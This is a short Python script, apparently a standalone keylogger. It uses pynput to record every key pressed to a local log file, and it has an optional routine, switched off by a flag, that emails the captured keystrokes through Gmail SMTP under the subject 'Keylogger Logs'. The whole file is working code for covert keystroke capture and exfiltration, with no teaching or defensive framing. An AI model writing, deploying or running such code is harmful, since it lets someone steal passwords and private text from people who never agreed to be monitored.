import logging
import smtplib
from email.mime.text import MIMEText

from pynput import keyboard

# Set up logging
logging.basicConfig(filename='keylog.log', level=logging.DEBUG)

def on_press(key):
    try:
        logging.debug(f'Key pressed: {key.char}')
    except AttributeError:
        logging.debug(f'Special key pressed: {key}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up email logging (optional)
email_logs = False
if email_logs:
    sender_email = 'your-email@gmail.com'
    receiver_email = 'your-email@gmail.com'
    password = 'your-password'

    def send_email(logs):
        msg = MIMEText(logs)
        msg['Subject'] = 'Keylogger Logs'
        msg['From'] = sender_email
        msg['To'] = receiver_email

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()

# Create keyboard listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()

# Send email logs (optional)
if email_logs:
    with open('keylog.log', 'r') as f:
        logs = f.read()
    send_email(logs)